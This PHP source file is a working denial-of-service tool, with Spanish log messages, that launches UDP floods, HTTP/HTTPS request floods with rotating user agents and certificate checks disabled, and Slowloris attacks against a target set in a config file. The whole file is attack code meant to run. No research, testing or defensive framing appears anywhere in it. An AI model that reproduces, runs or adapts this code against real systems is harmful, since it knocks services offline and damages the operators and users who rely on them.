<?php
set_time_limit(0);
ignore_user_abort(true);

$dir = __DIR__ . '/runtime';
$logFile = "$dir/attack.log";
$cfgFile = "$dir/attack.cfg";
$pidFile = "$dir/attack.pid";

function logmsg($msg) {
    global $logFile;
    file_put_contents($logFile, $msg . "\n", FILE_APPEND);
}

if (!file_exists($cfgFile)) {
    logmsg("[!] no config");
    exit;
}

$cfg = json_decode(file_get_contents($cfgFile), true);
$target    = $cfg['target'];
$type      = $cfg['type'];
$intensity = $cfg['intensity'];
$seconds   = $cfg['seconds'];
$threads   = $cfg['threads'];
$sockets   = $cfg['sockets'];
$size      = $cfg['size'];

logmsg("[*] Objetivo   : $target");
logmsg("[*] Tipo       : " . strtoupper($type));
logmsg("[*] Intensidad : $intensity");
logmsg("[*] Duración   : {$seconds}s");
logmsg("[*] Threads    : $threads | Sockets: $sockets | Size: $size");
logmsg(str_repeat("-", 42));

$end = time() + $seconds;
$start = time();

function parse_target($t) {
    $t = preg_replace('#^https?://#', '', $t);
    $parts = explode(':', $t);
    return [$parts[0], isset($parts[1]) ? (int)$parts[1] : null];
}

if ($type === 'udp') {
    [$host, $port] = parse_target($target);
    $port = $port ?: 80;
    logmsg("[+] UDP FLOOD → $host:$port");

    $payload = random_bytes($size);
    $sent = 0;
    $last = 0;

    while (time() < $end) {
        for ($i = 0; $i < $threads; $i++) {
            $sock = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            if ($sock) {
                @socket_sendto($sock, $payload, strlen($payload), 0, $host, $port);
                @socket_close($sock);
                $sent++;
            }
        }
        if ($sent - $last >= 2000) {
            logmsg("[>] $sent paquetes enviados...");
            $last = $sent;
        }
        usleep(500);
    }
    logmsg("[+] UDP terminado. Total paquetes: $sent");

} elseif ($type === 'http' || $type === 'https') {
    $url = $target;
    if (!preg_match('#^https?://#', $url)) {
        $url = ($type === 'https' ? 'https://' : 'http://') . $url;
    }
    logmsg("[+] " . strtoupper($type) . " FLOOD → $url");

    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148',
    ];

    $sent = 0;
    $last = 0;

    while (time() < $end) {
        for ($i = 0; $i < $threads; $i++) {
            $ctx = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => "User-Agent: " . $agents[array_rand($agents)] . "\r\nConnection: close\r\n",
                    'timeout' => 1.5,
                    'ignore_errors' => true
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            @file_get_contents($url . '?_=' . mt_rand(), false, $ctx);
            $sent++;
        }
        if ($sent - $last >= 400) {
            logmsg("[>] $sent requests enviados...");
            $last = $sent;
        }
    }
    logmsg("[+] HTTP/S terminado. Total requests: $sent");

} elseif ($type === 'slow') {
    [$host, $port] = parse_target($target);
    $port = $port ?: 80;
    logmsg("[+] SLOWLORIS → $host:$port | $sockets sockets");

    $list = [];
    for ($i = 0; $i < $sockets; $i++) {
        $s = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($s) {
            stream_set_blocking($s, false);
            fwrite($s, "GET /?" . mt_rand() . " HTTP/1.1\r\n");
            fwrite($s, "Host: $host\r\n");
            fwrite($s, "User-Agent: Mozilla/5.0\r\n");
            fwrite($s, "Accept-Language: en-US,en;q=0.5\r\n");
            $list[] = $s;
        }
    }
    logmsg("[+] " . count($list) . " sockets abiertos");

    while (time() < $end) {
        foreach ($list as $k => $s) {
            if (!is_resource($s) || feof($s)) {
                unset($list[$k]);
                $news = @fsockopen($host, $port, $errno, $errstr, 1);
                if ($news) {
                    stream_set_blocking($news, false);
                    fwrite($news, "GET /?" . mt_rand() . " HTTP/1.1\r\nHost: $host\r\n");
                    $list[] = $news;
                }
                continue;
            }
            @fwrite($s, "X-a: " . mt_rand(1, 9999) . "\r\n");
        }
        logmsg("[>] sockets activos: " . count($list));
        sleep(7);
    }
    foreach ($list as $s) @fclose($s);
    logmsg("[+] Slowloris terminado");
}

logmsg(str_repeat("-", 42));
logmsg("[*] Tiempo real: " . (time() - $start) . "s");
logmsg("[*] FIN");

@unlink($pidFile);
